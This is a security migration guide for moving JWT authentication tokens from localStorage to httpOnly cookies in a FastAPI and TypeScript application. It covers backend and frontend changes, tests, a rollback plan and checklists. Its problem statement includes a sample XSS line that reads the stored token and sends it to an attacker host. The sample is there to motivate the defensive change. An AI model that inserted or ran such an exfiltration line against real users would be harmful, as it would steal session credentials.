# Migration Guide: JWT Authentication from localStorage to httpOnly Cookies

## Executive Summary

This document describes the migration of JWT token storage from the vulnerable `localStorage` approach to secure `httpOnly cookies`. This addresses the critical XSS vulnerability that allowed attackers to steal authentication tokens.

**Status:** Ready for Implementation
**Priority:** CRITICAL - Security Issue
**Estimated Time:** 4-6 hours (including testing)

---

## Problem Statement

### Current Vulnerability

**Type:** Cross-Site Scripting (XSS) Vulnerability (CWE-79)
**CVSS Score:** 7.5 (High)

The current implementation stores JWT tokens in `localStorage`:
```javascript
// VULNERABLE - Current implementation
localStorage.setItem('access_token', token)
localStorage.setItem('refresh_token', token)
```

**Attack Vector:** If an attacker injects JavaScript into the page (via XSS), they can steal tokens:
```javascript
// XSS Attack Example
const token = localStorage.getItem('access_token')
fetch('https://attacker.com/steal?token=' + token)
```

### Why httpOnly Cookies are Better

1. **JavaScript Cannot Access**: httpOnly cookies are invisible to JavaScript
2. **Automatic CSRF Protection**: Cookies have SameSite flags
3. **Browser Managed**: Automatic expiration and renewal
4. **Secure by Default**: Secure flag forces HTTPS in production

---

## Implementation Details

### What Changed

#### Backend Changes

**File:** `/backend/modules/auth/router.py`

Changes:
- `/register` endpoint: Returns `UserResponse` instead of `TokenResponse`
- `/login` endpoint: Returns `UserResponse` instead of `TokenResponse`
- `/refresh` endpoint: Returns `UserResponse` instead of `TokenResponse`
- `/logout` endpoint: Deletes cookies instead of just revoking tokens
- All endpoints set httpOnly cookies with tokens

Example:
```python
response = Response(content=user.model_dump_json(), media_type="application/json")

response.set_cookie(
    key="access_token",
    value=access_token,
    httponly=True,  # JavaScript cannot access
    secure=not settings.DEBUG,  # HTTPS only in production
    samesite="lax",  # CSRF protection
    max_age=settings.ACCESS_TOKEN_EXPIRE_MINUTES * 60,
    path="/",
)

response.set_cookie(
    key="refresh_token",
    value=refresh_token_str,
    httponly=True,
    secure=not settings.DEBUG,
    samesite="lax",
    max_age=settings.REFRESH_TOKEN_EXPIRE_DAYS * 24 * 60 * 60,
    path="/",
)

return response
```

**File:** `/backend/api/dependencies.py`

Changes:
- New `get_token_from_request()` function extracts tokens from multiple sources (in priority order):
  1. httpOnly cookie (primary)
  2. Authorization header (fallback)
  3. OAuth2 bearer token (fallback)

This ensures backward compatibility while prioritizing the secure httpOnly cookie method.

**File:** `/backend/main.py`

Changes:
- CORS configuration must have `allow_credentials=True`
- This is CRITICAL for httpOnly cookies to work in cross-origin requests

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.CORS_ORIGINS,
    allow_credentials=True,  # CRITICAL for httpOnly cookies
    allow_methods=settings.CORS_METHODS,
    allow_headers=cors_headers,
)
```

#### Frontend Changes

**File:** `/frontend/lib/api/client.ts`

Changes:
1. Added `withCredentials: true` to axios config
2. Deprecated all token storage functions:
   - `getAuthToken()` → Returns null (tokens in cookies now)
   - `setAuthToken()` → Console warning (no-op)
   - `getRefreshToken()` → Returns null (tokens in cookies now)
   - `setRefreshToken()` → Console warning (no-op)
   - `removeAuthToken()` → Console warning (no-op)
   - `removeRefreshToken()` → Console warning (no-op)
3. Removed Authorization header injection from request interceptor
4. Token refresh now relies on httpOnly cookies being sent automatically

**File:** `/frontend/store/authStore.ts`

Changes:
1. Removed `persist` middleware configuration
2. Removed localStorage persistence of user state
3. Store now only maintains in-memory state
4. Tokens are no longer stored anywhere in the frontend

**Key Change:**
```typescript
// Before (VULNERABLE)
setAuth: (user, accessToken, refreshToken, tenantId) => {
  setAuthState(accessToken, refreshToken, tenantId)  // Stored in localStorage
  set({ user, isAuthenticated: true })
}

// After (SECURE)
setAuth: (user, accessToken, refreshToken, tenantId) => {
  setTenantId(tenantId)  // Only store non-sensitive tenant ID
  set({ user, isAuthenticated: true })  // In-memory state only
}
```

---

## Step-by-Step Migration

### Phase 1: Backend Deployment (0.5 hours)

#### Step 1: Update Auth Router
1. Edit `/backend/modules/auth/router.py`
2. Apply changes to `/register`, `/login`, `/refresh`, `/logout` endpoints
3. Verify imports include `Response` from FastAPI

**Validation:**
```bash
# Check syntax
python -m py_compile backend/modules/auth/router.py
```

#### Step 2: Update Dependencies
1. Edit `/backend/api/dependencies.py`
2. Add `get_token_from_request()` function
3. Update `get_current_user()` to use new token extraction

**Validation:**
```bash
# Check syntax
python -m py_compile backend/api/dependencies.py

# Run existing tests
pytest backend/tests/test_auth.py -v
```

#### Step 3: Update CORS Configuration
1. Edit `/backend/main.py`
2. Change `allow_credentials=settings.CORS_CREDENTIALS` to `allow_credentials=True`
3. Add comments explaining the requirement

**Validation:**
```bash
# Check syntax
python -m py_compile backend/main.py

# Test CORS configuration
curl -H "Origin: http://localhost:3000" \
     -H "Access-Control-Request-Method: POST" \
     -X OPTIONS \
     http://localhost:8000/api/v1/auth/login
```

#### Step 4: Run Security Tests
1. Add test file: `/backend/tests/test_auth_security.py`
2. Run tests to verify cookie security

```bash
pytest backend/tests/test_auth_security.py -v
```

### Phase 2: Frontend Deployment (1-2 hours)

#### Step 1: Update API Client
1. Edit `/frontend/lib/api/client.ts`
2. Add `withCredentials: true` to axios config
3. Update request/response interceptors
4. Deprecate token storage functions

**Validation:**
```bash
# TypeScript compilation
npm run build

# Run linting
npm run lint
```

#### Step 2: Update Auth Store
1. Edit `/frontend/store/authStore.ts`
2. Remove `persist` middleware
3. Remove token storage logic
4. Keep only tenant ID and user state in memory

**Validation:**
```bash
# TypeScript compilation
npm run build

# Check for any storage calls
grep -r "localStorage\|sessionStorage" src/store/ || echo "No storage calls found"
```

#### Step 3: Add Security Tests
1. Add test file: `/frontend/__tests__/security/xss-protection.test.ts`
2. Run tests to verify no tokens in storage

```bash
npm run test -- xss-protection.test.ts
```

#### Step 4: Update Login/Register Pages
1. Review `/frontend/app/(auth)/login/page.tsx`
2. Review `/frontend/app/(auth)/register/page.tsx`
3. Verify they use auth hooks (no direct token handling)
4. Verify useAuth hook calls setAuth with correct parameters

**Expected Changes:** None needed (hooks handle everything)

#### Step 5: Test Application Flow

```bash
npm run dev

# Manual Testing Checklist:
# 1. Register new account
# 2. Verify redirect to dashboard
# 3. Refresh page - should still be logged in (cookie present)
# 4. Check browser DevTools - cookies should be httpOnly
# 5. Try to access localStorage.getItem('access_token') in console - should be null
# 6. Logout
# 7. Verify redirect to login
# 8. Verify cookies are deleted
```

### Phase 3: Full Integration Testing (2-3 hours)

#### Test 1: Token Storage Security
```bash
# Run all security tests
npm run test -- security/

# Verify no tokens in localStorage
grep -r "access_token\|refresh_token" frontend/lib/api/client.ts | grep -v "httponly\|cookie\|deprecated"
```

#### Test 2: Authentication Flow
```bash
# Test login/logout
curl -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"Test123"}'

# Verify response contains no tokens
# Verify Set-Cookie headers are present with httpOnly flag
```

#### Test 3: Cross-Origin Requests
```bash
# Test from frontend (localhost:3000)
# Verify cookies are sent with requests
# Check Network tab in DevTools - should see Cookie header
```

#### Test 4: Token Refresh
```bash
# Make request after token expiration
# Verify automatic refresh happens
# Check that new cookies are set
# Verify original request retries and succeeds
```

---

## Configuration Requirements

### Environment Variables

No changes required. The following settings are used:
```
ACCESS_TOKEN_EXPIRE_MINUTES=15  # Default: 15 minutes
REFRESH_TOKEN_EXPIRE_DAYS=7     # Default: 7 days
DEBUG=false                      # Production: false (enables secure flag)
CORS_ORIGINS=http://localhost:3000,https://app.example.com
```

### HTTPS Requirement (Production)

In production, ensure:
1. Backend uses HTTPS
2. Frontend uses HTTPS
3. CORS_ORIGINS only includes HTTPS URLs

The `secure=not settings.DEBUG` flag ensures cookies only work over HTTPS in production.

---

## Backwards Compatibility

### Migration Strategy

The implementation maintains backwards compatibility:

1. **Token Extraction Priority:**
   - Primary: httpOnly cookies (new, secure method)
   - Fallback: Authorization header (old method)
   - Fallback: OAuth2 bearer (old method)

2. **Token Functions:**
   - Deprecated functions still exist but return null/noop
   - Client code won't break, but will log warnings
   - Complete removal possible in next major version

3. **API Responses:**
   - Old: `TokenResponse` with tokens in body
   - New: `UserResponse` without tokens in body
   - Clients expecting tokens must be updated

### Breaking Changes

1. **API Response Format Change:**
   - `/auth/login` now returns `UserResponse` instead of `TokenResponse`
   - `/auth/register` now returns `UserResponse` instead of `TokenResponse`
   - `/auth/refresh` now returns `UserResponse` instead of `TokenResponse`
   - Tokens are in cookies, not in response

2. **Required Client Update:**
   - Frontend must use `withCredentials: true`
   - Frontend must not expect tokens in response body

3. **Mobile/Native Apps:**
   - httpOnly cookies don't work on mobile apps
   - Mobile apps should use Authorization header fallback:
     ```javascript
     // Mobile app: Get token from refresh endpoint, use it in header
     const response = await fetch('/api/v1/auth/login', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ email, password })
     })
     // Extract token from response and use in Authorization header
     ```

---

## Rollback Plan

### Quick Rollback (< 1 hour)

If issues occur immediately after deployment:

#### Step 1: Revert Backend
```bash
# Git rollback
git revert <commit-hash>

# Or manually:
# 1. Restore original /backend/modules/auth/router.py
# 2. Restore original /backend/api/dependencies.py
# 3. Restore original /backend/main.py
# 4. Restart backend service
```

#### Step 2: Revert Frontend
```bash
# Git rollback
git revert <commit-hash>

# Or manually:
# 1. Restore original /frontend/lib/api/client.ts
# 2. Restore original /frontend/store/authStore.ts
# 3. Run `npm run build`
# 4. Restart frontend service
```

#### Step 3: Clear User Cookies
```javascript
// Run in browser console for affected users
document.cookie = "access_token=; Max-Age=0; path=/;"
document.cookie = "refresh_token=; Max-Age=0; path=/;"
localStorage.clear()
// User should refresh page and log in again
```

### Gradual Rollback (Safe Approach)

1. Disable new cookie-based auth in feature flag
2. Roll back to old localStorage method temporarily
3. Investigate and fix issues
4. Redeploy with improvements

### Known Issues & Fixes

#### Issue 1: "Cookies not sent with requests"
**Cause:** Missing `withCredentials: true` or CORS `allow_credentials=False`

**Fix:**
```javascript
// Ensure withCredentials is set
axios.defaults.withCredentials = true

// Backend: Ensure CORS allows credentials
allow_credentials=True
```

#### Issue 2: "401 Unauthorized after refresh"
**Cause:** Refresh token not being read from cookie

**Fix:**
```python
# Verify get_token_from_request checks cookies first
if "access_token" in request.cookies:
    return request.cookies["access_token"]
```

#### Issue 3: "Cookies not visible in DevTools"
**Cause:** httpOnly cookies are hidden by design

**Normal Behavior:** httpOnly cookies don't appear in:
- `document.cookie`
- JavaScript console
- Network tab cookie inspection

**Verification:**
1. Check Network tab → Response headers
2. Look for `Set-Cookie: access_token=...;HttpOnly;Secure`
3. Check Application tab → Cookies → look for httpOnly flag

---

## Security Validation Checklist

After deployment, verify the following security properties:

### Token Storage Security
- [ ] `localStorage.getItem('access_token')` returns null
- [ ] `localStorage.getItem('refresh_token')` returns null
- [ ] `sessionStorage.getItem('access_token')` returns null
- [ ] `document.cookie` does not contain tokens
- [ ] `getAuthToken()` returns null (deprecated function)
- [ ] `getRefreshToken()` returns null (deprecated function)

### Cookie Security
- [ ] Cookies have `HttpOnly` flag (check Set-Cookie header)
- [ ] Cookies have `Secure` flag in production (HTTPS only)
- [ ] Cookies have `SameSite=Lax` flag (CSRF protection)
- [ ] Cookies have `Path=/` (available to entire app)
- [ ] Cookies have appropriate `Max-Age` values

### API Security
- [ ] Login response contains NO tokens in body
- [ ] Login response contains Set-Cookie headers
- [ ] Logout response deletes cookies (Max-Age=0)
- [ ] Protected endpoints reject requests without cookies
- [ ] Protected endpoints accept requests with valid cookies

### CORS Configuration
- [ ] CORS `allow_credentials=True`
- [ ] CORS `allow_origins` includes frontend domain
- [ ] Preflight OPTIONS requests succeed
- [ ] Cookies are sent with cross-origin requests

### XSS Protection
- [ ] Run `npm run test -- security/xss-protection.test.ts`
- [ ] All tests pass
- [ ] No tokens found in localStorage
- [ ] No tokens found in window/global scope

---

## Testing Strategy

### Unit Tests
```bash
# Backend: Test auth endpoints
pytest backend/tests/test_auth_security.py -v

# Frontend: Test security properties
npm run test -- security/xss-protection.test.ts -v
```

### Integration Tests
```bash
# Test full auth flow with cookies
pytest backend/tests/test_auth_flow.py -v
npm run test -- integration/auth-flow.test.ts -v
```

### Manual Testing Checklist

**Login Flow:**
- [ ] User can register new account
- [ ] User receives redirect to dashboard
- [ ] User can login with credentials
- [ ] User receives redirect to dashboard
- [ ] DevTools shows httpOnly cookies

**Session Persistence:**
- [ ] User can refresh page and stay logged in
- [ ] User info is fetched from /auth/me endpoint
- [ ] User can access all protected pages
- [ ] User can make API requests

**Token Refresh:**
- [ ] Wait 15+ minutes (or set short expiry for testing)
- [ ] Make API request after token expiry
- [ ] Request should auto-retry with new token
- [ ] New cookies should be set

**Logout Flow:**
- [ ] User can logout
- [ ] User receives redirect to login page
- [ ] Cookies are deleted
- [ ] User cannot access protected pages

**Security Validation:**
- [ ] Open DevTools Console
- [ ] Type: `localStorage.getItem('access_token')`
- [ ] Should return `null`
- [ ] Type: `document.cookie`
- [ ] Should NOT contain `access_token` or `refresh_token`

---

## Monitoring & Debugging

### Enable Debug Logging (Frontend)

```typescript
// In development, enable verbose logging
localStorage.setItem('DEBUG', 'api:*')

// Check browser console for:
// - Deprecated function warnings
// - Token refresh events
// - Cookie operations
```

### Verify Cookies with cURL

```bash
# Make login request and capture cookies
curl -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"Test123"}' \
  -v

# Look for Set-Cookie headers:
# Set-Cookie: access_token=...; HttpOnly; Secure; SameSite=Lax
# Set-Cookie: refresh_token=...; HttpOnly; Secure; SameSite=Lax

# Use cookies in subsequent request
curl -X GET http://localhost:8000/api/v1/auth/me \
  -b "access_token=..." \
  -b "refresh_token=..."
```

### Check CORS Headers

```bash
# Verify CORS configuration
curl -X OPTIONS http://localhost:8000/api/v1/auth/login \
  -H "Origin: http://localhost:3000" \
  -H "Access-Control-Request-Method: POST" \
  -v

# Should include:
# Access-Control-Allow-Credentials: true
# Access-Control-Allow-Origin: http://localhost:3000
```

---

## FAQ

### Q: Why not use sessionStorage instead of cookies?
**A:** sessionStorage is still vulnerable to XSS because it's accessible from JavaScript. httpOnly cookies cannot be accessed from JavaScript, making them XSS-proof.

### Q: Will this work on mobile apps?
**A:** httpOnly cookies work on native mobile apps with proper cookie jar implementation, but require special handling. The fallback Authorization header method is recommended for mobile.

### Q: Can we still use this with GraphQL?
**A:** Yes, GraphQL clients (Apollo Client, etc.) with proper configuration will work. Ensure:
- `withCredentials: true` is set
- CORS allows credentials

### Q: How do we handle token expiration?
**A:** The response interceptor automatically refreshes tokens when a 401 is received. The new access_token is set as a cookie by the server.

### Q: Is this compatible with third-party integrations?
**A:** Yes, if they use Authorization header or cookies. If they expect tokens in the response body, they need to be updated to use Authorization header (for backwards compatibility).

### Q: What about CSRF attacks?
**A:** Cookies have `SameSite=Lax` flag which prevents CSRF. Additionally, the backend has CSRF middleware for POST/PUT/DELETE requests.

---

## Success Criteria

The migration is successful when:

1. **Security:**
   - No JWT tokens in localStorage
   - No JWT tokens accessible from JavaScript
   - All security tests pass

2. **Functionality:**
   - Login/logout work normally
   - Users stay logged in after page refresh
   - Token refresh happens automatically
   - Protected endpoints work correctly

3. **Performance:**
   - No noticeable performance degradation
   - Same page load times
   - Same API response times

4. **Compatibility:**
   - Existing client code works (with deprecation warnings)
   - New secure method works without warnings
   - Fallback methods work (Authorization header)

---

## Post-Deployment Actions

### 1. Monitor for Issues (First 24 hours)
- Check error logs for auth-related failures
- Monitor user complaints
- Verify error rates are normal

### 2. Notify Users
- Inform users about the security improvement
- Ask them to re-login (optional, but recommended)
- Provide FAQ if needed

### 3. Document for Team
- Update API documentation
- Update auth flow diagrams
- Add security best practices guide

### 4. Schedule Review
- Review after 1 week
- Review after 1 month
- Plan removal of backwards compatibility code

---

## References

- [OWASP: Local Storage](https://owasp.org/www-community/vulnerabilities/Local_Storage_Exposure)
- [OWASP: Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [OWASP: Secure Cookie Flag](https://owasp.org/www-community/controls/Cookie_Security)
- [MDN: httpOnly Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#httponly)
- [FastAPI: CORS Documentation](https://fastapi.tiangolo.com/tutorial/cors/)
- [Auth0: Cookies vs Tokens](https://auth0.com/resources/whitepapers/cookies-vs-tokens)

---

## Support

For issues during migration:
1. Check this guide's troubleshooting section
2. Review the security test files for expected behavior
3. Check Git history for what changed
4. Review error logs and browser console for specific errors
5. Reference the rollback plan if critical issues occur

---

**Document Version:** 1.0
**Last Updated:** 2024-11-14
**Status:** Ready for Implementation
**Author:** Security Engineering Team
